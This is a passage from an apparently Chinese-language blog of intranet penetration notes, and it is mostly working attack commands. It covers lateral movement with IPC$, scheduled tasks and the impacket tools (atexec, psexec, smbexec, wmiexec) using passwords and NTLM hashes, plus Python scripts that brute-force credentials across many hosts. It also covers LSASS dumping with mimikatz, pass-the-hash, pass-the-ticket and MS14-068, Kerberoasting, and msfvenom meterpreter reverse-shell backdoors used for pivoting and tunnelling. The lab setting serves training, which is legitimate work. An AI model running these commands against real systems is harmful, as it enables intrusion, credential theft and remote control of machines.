\\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # 建立 ipc 连接：copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务对应执行文件schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务</code></pre><h2 id="atexec-impacket-明文和HASH-传递攻击"><a href="#atexec-impacket-明文和HASH-传递攻击" class="headerlink" title="atexec-impacket 明文和HASH 传递攻击"></a><strong>atexec-impacket 明文和HASH 传递攻击</strong></h2><p><strong>impacket的exe版本:<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></strong></p><p><strong>优点:命令简单，易上手</strong></p><p><strong>缺点:非官方自带，可能被杀</strong></p><pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320153845240.png" alt="image-20220320153845240"></p><p><strong>明文 HASH 传递批量利用</strong></p><p>收集活跃ip，放在ip.txt中</p><pre><code>FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测 IP 对应明文连接FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测 IP 对应明文回显版</code></pre><p>收集可能的密码和hash放在文件中</p><pre><code>FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应 IP回显版FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测 HASH 对应 IP 回显版</code></pre><p><strong>明文HASH传递批量利用-升级版</strong></p><p>利用py脚本制作的exe文件批量尝试横向渗透</p><p>Fuck.py</p><pre><code class="python">import osimport timeips=&#123;    &#39;192.168.3.30&#39;,    &#39;192.168.3.25&#39;,    &#39;192.168.3.32&#39;,    &#39;192.168.3.29&#39;&#125;users=&#123;    &#39;admin&#39;,    &#39;user&#39;,    &#39;Administrator&#39;,    &#39;webadmin&#39;,    &#39;boss&#39;&#125;passwds=&#123;    &#39;123456&#39;,    &#39;passwd&#39;,    &#39;admin123&#39;    &#39;admin666&#39;&#125;for ip in ips:    for user in users:        for passwd in passwds:            exec = &quot;net use \\&quot;+ &quot;\\&quot; + ip +&#39;ipc$ &#39;+passwd+&#39; /user:god\\&#39; + user            print(&#39;----&gt;&#39;+exec+&#39;&lt;----&#39;)            os.system(exec)            time.sleep(1)</code></pre><p>执行效果</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320161721565.png" alt="image-20220320161721565"></p><p>将python脚本编译成exe文件</p><p>安装pyinstaller</p><pre><code>pip install pyinstaller</code></pre><p>生成可执行EXE</p><pre><code>Pyinstaller -F [.py文件]</code></pre><p>会生成一个同名的exe文件 </p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162043000.png" alt="image-20220320162043000"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162242560.png" alt="image-20220320162242560"></p><h2 id="Procdump-Mimikatz-配合获取hash密码"><a href="#Procdump-Mimikatz-配合获取hash密码" class="headerlink" title="Procdump+Mimikatz 配合获取hash密码"></a><strong>Procdump+Mimikatz 配合获取hash密码</strong></h2><p>这种情况适用于mimikatz被杀，但是自己做免杀失败/或不想做免杀可以来与Procdump配合使用，因为Procdump是官方自带的，所以不会被杀</p><ul><li>Procdump下载：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></li><li>mimikatz下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></li></ul><pre><code># procdump 在目标机上执行procdump -accepteula -ma lsass.exe lsass.dmp# mimikatz 在本地执行：privilege::debugesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320165205243.png" alt="image-20220320165205243"></p><p>然后可以利用 Hashcat 破解获取 Windows NTML Hash</p><h2 id="SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方"><a href="#SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方" class="headerlink" title="SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)"></a><strong>SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)</strong></h2><p><strong>psexec</strong></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools - Windows Sysinternals | Microsoft Docs</a></p><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。</p><pre><code>#psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administratorpsexec \\192.168.3.32 -s cmd # 需要先有 ipc 链接 -s 以 System 权限运行exit #退出</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320171306833.png" alt="image-20220320171306833"></p><pre><code>#psexec 第二种：不用建立 IPC 直接提供明文账户密码psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172223595.png" alt="image-20220320172223595"></p><p>但是当我们使用hash传递时</p><pre><code>psexec -hashes :$HASH$ ./administrator@10.1.2.3psexec -hashes :$HASH$ domain/administrator@10.1.2.3psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 官方 Pstools 无法采用 hash 连接#非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172705914.png" alt="image-20220320172705914"></p><p>就会出现问题，这是因为官方 Pstools 无法采用 hash 连接，所以我们可以使用 impacket 工具包</p><p>缺点:非官方，会被杀毒软件杀掉，所以要做免杀</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173053675.png" alt="image-20220320173053675"></p><p><strong>smbexec</strong></p><p>无需先 ipc 链接 明文或 hash 传递</p><pre><code>smbexec god/administrator:Admin12345@192.168.3.21smbexec ./administrator:admin!@#45@192.168.3.32smbexec -hashes :$HASH$ ./admin@192.168.3.21smbbexec -hashes :$HASH$ domain/admin@192.168.3.21smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173615976.png" alt="image-20220320173615976"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173738115.png" alt="image-20220320173738115"></p><h2 id="WMI-服务利用-wmic-cscript-wmiexec"><a href="#WMI-服务利用-wmic-cscript-wmiexec" class="headerlink" title="WMI 服务利用-wmic,cscript,wmiexec"></a><strong>WMI 服务利用-wmic,cscript,wmiexec</strong></h2><p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p><p><strong>自带 WMIC 明文传递 无回显 所以写入文件夹后还要自己想办法读取</strong></p><pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;    </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180441580.png" alt="image-20220320180441580"></p><p><strong>自带 cscript 明文传递 有回显</strong></p><pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345#escript不需要下载，自带。但是需要用到第三方 wmiexec.vbs，但是wmiexec.vbs免杀非常简单</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180646769.png" alt="image-20220320180646769"></p><p>套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p><pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p>缺点：容易被杀</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181811547.png" alt="image-20220320181811547"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181844775.png" alt="image-20220320181844775"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320182207418.png" alt="image-20220320182207418"></p><p>同理可以借用编程解放双手</p><p><strong>hash 批量利用-python 编译 exe</strong></p><pre><code class="python">#pyinstaller.exe -F fuck_neiwang_002.pyimport os,timeips=&#123;&#39;192.168.3.21&#39;,&#39;192.168.3.25&#39;,&#39;192.168.3.29&#39;,&#39;192.168.3.30&#39;,&#39;192.168.3.32&#39;&#125;users=&#123;&#39;Administrator&#39;,&#39;boss&#39;,&#39;dbadmin&#39;,&#39;fileadmin&#39;,&#39;mack&#39;,&#39;mary&#39;,&#39;webadmin&#39;&#125;hashs=&#123;&#39;ccef208c6485269c20db2cad21734fe7&#39;,&#39;518b98ad4178a53695dc997aa02d455c&#39;&#125;for ip in ips:for user in users:for mimahash in hashs:#wmiexec -hashes :hashgod/user@ipwhoamiexec = &quot;wmiexec -hashes :&quot;+mimahash+&quot; god/&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)os.system(exec)time.sleep(0.5)</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320183203790.png" alt="image-20220320183203790"></p><h2 id="PTH-amp-PTK-amp-PTT哈希票据传递"><a href="#PTH-amp-PTK-amp-PTT哈希票据传递" class="headerlink" title="PTH&amp;PTK&amp;PTT哈希票据传递"></a><strong>PTH&amp;PTK&amp;PTT哈希票据传递</strong></h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322132427400.png" alt="image-20220322132427400"></p><p>Kerberos 协议在域中具体工作方法： </p><p>**1、客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用 krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检 测，成功之后创建 TGT(Ticket-Granting Ticket) **</p><p>**2、将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读 取 kerberos 中 TGT 数据 **</p><p>**3、 然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服 务）票证，并且对 TGT 进行检测 **</p><p><strong>4、 检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将 加密后的结果返回给客户机。</strong></p><pre><code>PTH(pass the hash) #利用 lm 或 ntlm 的值进行的渗透测试 PTT(pass the ticket) #利用的票据凭证 TGT 进行的渗透测试 PTK(pass the key) #利用的 ekeys aes256 进行的渗透测试</code></pre><p><strong>PTH</strong></p><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。</p><p> 总结：KB2871997 补丁后的影响</p><p>pth：没打补丁用户都可以连接，打了补丁只能 administrator 连接 </p><p>ptk：打了补丁才能用户都可以连接，采用 aes256 连接</p><p>参考链接: <a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p><p><strong>PTT</strong></p><p>PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的。</p><p>三种 常见的攻击方法：MS14-068，Golden ticket，SILVER ticket。</p><p>MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限，微软给出的补丁是 kb3011780。</p><p>Golden ticket(黄金票据)，SILVER ticket(白银票据)，属于权限维持技术 ，简单来说就是将连接合法的票据注入到 内存中实现连接。</p><p><strong>案例:</strong></p><p><strong>1.PTH传递-mimikatz</strong></p><p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。</p><pre><code>privilege::debugsekurlsa::logonPasswords</code></pre><p>假设我们找到了域控的hash密码</p><pre><code># PTH ntlm 传递# 未打补丁下的工作组及域连接：sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7  #连接域用户sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c #连接本地用户sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7\\OWA2010CN-God.god.org</code></pre><p>就会弹出一个cmd窗口</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322173836031.png" alt="image-20220322173836031"></p><p><strong>2.PTK传递-mimikatz</strong></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322180108315.png" alt="image-20220322180108315"></p><p>这个必须打了补丁才能连接，不然连不上去</p><pre><code>PTK aes256 传递打补丁后的工作组及域连接：sekurlsa::ekeys #获取 aessekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</code></pre><p><strong>3.域横向移动 PTT 传递-ms14068&amp;kekeo&amp;本地</strong></p><p>第一种利用漏洞：能实现普通用户直接获取域控 system 权限</p><p>此处mimikatz无需提升权限，因为不涉及高权限操作，一个普通用户就可以</p><pre><code>#MS14-068 powershell 执行1.查看当前 sid whoami/user2.mimikatz # kerberos::purge//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造mimikatz # kerberos::list //查看当前机器凭证mimikatz # kerberos::ptc 票据文件 //将票据注入到内存中3.利用 ms14-068 生成 TGT 数据ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#454.票据注入内存mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit5.查看凭证列表 klist6.利用dir \\192.168.3.21\c$  #如果ip无法识别，改成计算机名字</code></pre><p>第二种利用工具 kekeo</p><pre><code>1.生成票据kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;2.导入票据kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi3.查看凭证 klist4.利用 net use 载入dir \\192.168.3.21\c$</code></pre><p>第三种利用mimikatz导出本地票据(需要管理权限)</p><p>域控连接后10h内有效</p><pre><code>privilege::debugsekurlsa::tickets /exportkerberos::ptt xxxxxxxxxx.xxxx.kirbi</code></pre><p><strong>总结：ptt 传递不需本地管理员权限，连接时主机名连接，基于漏洞,工具,本地票据</strong></p><h2 id="RDP与SPN"><a href="#RDP与SPN" class="headerlink" title="RDP与SPN"></a><strong>RDP与SPN</strong></h2><p><strong>RDP</strong></p><p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p><pre><code>RDP明文密码链接1.windows: mstsc2.mstsc.exe /console /v:192.168.3.21 /admin3.linux: rdesktop 192.168.3.21:3389RDP密文HASH链接windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；开启命令：REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f开启后运行：1.mstsc.exe /restrictedadmin2.mimikatz.exe3.privilege::debug4.sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 &quot;/run:mstsc.exe /restrictedadmin&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/4c75562739b29a50be3268d18090dd94.png" alt="img"></p><p><strong>域横向移动SPN服务-探针,请求,导出,破解,重写</strong></p><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p><p>1、探针</p><pre><code>setspn -q */*setspn -q */* | findstr &quot;MSSQL&quot;</code></pre><p>2、请求票据</p><pre><code>klist purge //删除缓存票据klist    //查看票据# 请求票据 # powershell请求Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;# 或者mimikatz请求mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</code></pre><p>3、导出票据(到mimikatz运行目录)</p><pre><code># mimikatzmimikatz.exe &quot;kerberos::list /export&quot;</code></pre><p>4、破解票据</p><pre><code># 破解工具tgsrepcrack.py python3环境运行（将票据拖到本地破解）python tgsrepcrack.py passwd.txt xxxx.kirbipython3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</code></pre><p>5、重写票据（属于后续攻击，不一定会成功，-u500指的是管理员用户，-g512指的是管理员组）</p><pre><code>python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存</code></pre><p>6、利用</p><pre><code>dir //xxx.xxx.xxx.xxx/c$</code></pre><h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h1><h2 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h2><p>通常，我们用于调试的计算机无法远程访问位于局域网中的待调试设备。通过 ssh 的端口转发(又称 ssh 隧道)技术，可以实现这种远程调试功能。ssh 客户端运行于本地机器，它的作用是：登录到目标机器并在目标机器上执行命令。它可以建立一个安全通道，为不安全网络上两个不受信任的主机提供安全的加密通信。X11 连接、任意 TCP 端口和 UNIX 域套接字也可以通过 ssh 安全通道进行转发。ssh 连接并登录到指定的主机名(用户名可选)。如果指定了命令，命令将在远程主机上执行，而不是在本机 shell 里执行。</p><p>ssh 端口转发相关的常用选项如下：</p><hr><p><strong>-C</strong></p><p>请求压缩所有数据(包括 stdin、stdout、stderr 和用于转发的 X11、TCP 和 UNIX 域连接的数据)。压缩算法与 gzip 使用的算法相同，压缩级别由 ssh 协议版本 1 的 CompressionLevel 选项控制。在调制解调器线路和其他慢速连接上采用压缩是可取的，但它会减慢快速网络上的速度。</p><hr><p><strong>-f</strong></p><p>请求 ssh 在执行命令之前转到后台。如果用户希望 ssh 在后台运行，但 ssh 需要用户提供密码或口令，使用 -f 选项就很有用，在用户输入密码之后，ssh 就会转入后台运行。这个选项隐含了 -n 选项的功能(-n 选项将 stdin 重定向到 /dev/null，从而避免后台进程读 stdin)。在远程站点上启动 X11 程序的推荐方法是使用 “ssh -f host xterm” 。</p><p>如果 ExitOnForwardFailure 配置选项设置的是 “yes”，则使用 -f 选项启动的 ssh 客户端会等所有的远程端口转发建立成功后才将自己转到后台运行。</p><hr><p><strong>-n</strong></p><p>将 stdin 重定向到 /dev/null (实际上是为了防止后台进程从stdin读取数据)。当 ssh 在后台运行时必须使用此选项。</p><p>一个常见的技巧是使用它在目标机器上运行 X11 程序。例如，<code>ssh -n shadow.cs.hut.fi emacs &amp;</code> 将在 shadows.cs.hut.fi 上启动 emacs 程序。X11 的连接将通过加密通道自动转发。ssh 程序将在后台运行。(如果 ssh 需要请求密码或口令，则此操作无效；参见-f选项。)</p><hr><p><strong>-N</strong></p><p>不执行远程命令。此选项用于只需要端口转发功能时。</p><hr><p><strong>-g</strong></p><p>允许远程主机连接到本地转发端口。如果用于多路复用连接，则必须在主进程上指定此选项。</p><hr><p><strong>-t</strong></p><p>强制分配一个伪终端。在目标机上执行任意的基于屏幕的程序时(例如，实现菜单服务)，分配伪终端很有用。使用多个 -t 选项则会强制分配终端，即使 ssh 没有本地终端。</p><hr><p><strong>-T</strong></p><p>禁止分配伪终端。</p><hr><p><strong>-L [bind_address:]port:host:hostport</strong><br><strong>-L [bind_address:]port:remote_socket</strong><br><strong>-L local_socket:host:hostport</strong><br><strong>-L local_socket:remote_socket</strong></p><p>数据从本机转发到远程。本机上指定 TCP 端口或 UNIX 套接字的连接将被转发到目标机上指定端口或套接字。</p><p>上述参数中，bind_address 指本地地址；port 指本地端口；local_socket 指本地 UNIX 套接字；host 指远程主机地址；hostport 指远程端口；remote_socket 指远程 UNIX 套接字。</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318150851834.png" alt="image-20220318150851834"> </p><p><strong>ssh 端口转发模式</strong></p><p>ssh 的端口转发有三种模式：</p><ul><li><p><strong>本地：ssh -C -f -N -g -L local_listen_port:remote_host:remote_port agent_user@agent_host</strong></p><p>将本地机监听端口 local_listen_port 上的数据转发到远程端口 remote_host:remote_port</p></li><li><p><strong>远程：ssh -C -f -N -g -R agent_listen_port:local_host:local_port agent_user@agent_host</strong></p><p>将代理机监听端口 agent_listen_port 上的数据转发到本地端口 local_host:local_port</p></li><li><p><strong>动态：ssh -C -f -N -g -D listen_port agent_user@agent_host</strong></p></li></ul><p><strong>正向连接</strong></p><p>WEB服务器执行</p><pre><code>ssh -CNfL 0.0.0.0:7777:10.10.10.128:80 web@192.168.0.144</code></pre><p><strong>反向连接</strong></p><p>在攻击机上启动ssh</p><pre><code>/etc/init.d/ssh start</code></pre><p>在web服务器上执行</p><pre><code>ssh -qTfnN -R port:host:hostport remote_ipssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.0.115  # 将本地的22端口转发到192.168.0.115 的2222端口</code></pre><p>攻击机上再执行</p><pre><code>ssh -p 2222 web@127.0.0.1</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318161331485.png" alt="image-20220318161331485"></p><p><strong>Socket代理</strong></p><pre><code>SSH -qTfnN -D port remotehots</code></pre><h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318213918972.png" alt="image-20220318213918972"></p><p>生成metaploit后门</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.196set lport 12345exploit</code></pre><p>当运行后门，得到反弹shell后</p><p><strong>映射端口:</strong></p><pre><code>portfwd add -L 192.168.0.115 -l 2020 -p 80 -r 10.10.10.128</code></pre><p>此时我们访问 本机的2020端口 即打开192.168.0.115:2020 实际上访问的是 10.10.10.128:80 的服务</p><p><strong>端口转发</strong></p><pre><code>portfwd add -l 5555 -p 3389 -r 192.168.0.149 #将肉鸡的3389端口映射到本地的5555端口rdesktop 127.0.0.1:5555</code></pre><p><strong>查看列表</strong></p><pre><code>portfwd list</code></pre><p><strong>清空列表</strong></p><pre><code>portfwd flush</code></pre><h2 id="socket隧道"><a href="#socket隧道" class="headerlink" title="socket隧道"></a>socket隧道</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318220150442.png" alt="image-20220318220150442"></p><p>​    下载地址:</p><pre><code>http://sourceforge.net/project/ssocks/</code></pre><p>解压编译:</p><pre><code>tar zxvf ssocks-0.0.14.tar.gzcd ssocks-0.0.14./configure &amp;&amp; make #编译后会创建一个src文件夹cd src</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318221138321.png" alt="image-20220318221138321"></p><p>kali机使用：</p><pre><code>./rcsocks -l 1088 -p 1080 -vv</code></pre><p>等待远程socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道</p><p>web服务器:</p><pre><code>/rssocks -vv -s 192.168.10.115:1080</code></pre><p>利用proxychains进行Socks5代理</p><p> 编辑proxychains工具</p><pre><code>vim /etc/proxychains.conf</code></pre><p>注释掉socks4，加上socks5</p><pre><code>#socks4 127.0.0.1 9050socks5 127.0.0.1 1088</code></pre><p>kail机使用代理访问：</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>就会成功访问</p><p>使用nmap扫描</p><pre><code>proxychains nmap -Pn -sT 10.10.10.128</code></pre><h1 id="跨路由扫描"><a href="#跨路由扫描" class="headerlink" title="跨路由扫描"></a>跨路由扫描</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318224021872.png" alt="image-20220318224021872"></p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到反弹shell</p><pre><code>getuid  查看当前用户ifconfig  获取网卡信息run get_local_subnets 获取路由信息run autoroute -p 查看当前路由run autoroute -s 10.10.10.0/24 增加路由 </code></pre><p>使用socks4a模块</p><pre><code>use auxiliary/server/socks4a</code></pre><p>　SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。<br>   SRVPORT：监听的端口，默认为1080。</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318225453685.png" alt="image-20220318225453685"></p><p>设置端口</p><pre><code>set SRVPORT 1044exploit</code></pre><p>然后配置proxychains</p><pre><code>vim /etc/proxychains.conf</code></pre><p>proxychains.conf </p><pre><code>socks4 192.168.0.115 1044</code></pre><p>使用nmap扫描</p><pre><code>proxychains nmap -sT Pn 10.10.10.128</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318230018344.png" alt="image-20220318230018344"></p><p>也可以用浏览器访问</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>缺点:</p><p>无法进行爆破(如hydra)等一些操作</p><h1 id="MSF-常见的内网测试渗透"><a href="#MSF-常见的内网测试渗透" class="headerlink" title="MSF-常见的内网测试渗透"></a>MSF-常见的内网测试渗透</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318231904664.png" alt="image-20220318231904664"></p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到2003服务器反弹shell</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234051072.png" alt="image-20220318234051072"></p><p>查看路由表</p><pre><code>route</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234749786.png" alt="image-20220318234749786"></p><p>增加路由</p><pre><code>run autoroute -s 10.10.10.0/24</code></pre><p>查看路由列表</p><pre><code>run autoroute -p</code></pre><p>清空路由</p><pre><code>run autoroute -d</code></pre><p>提权命令:</p><pre><code>sysinfo 查看系统信息</code></pre><pre><code>ps 查看进程</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235448756.png" alt="image-20220318235448756"></p><p><img 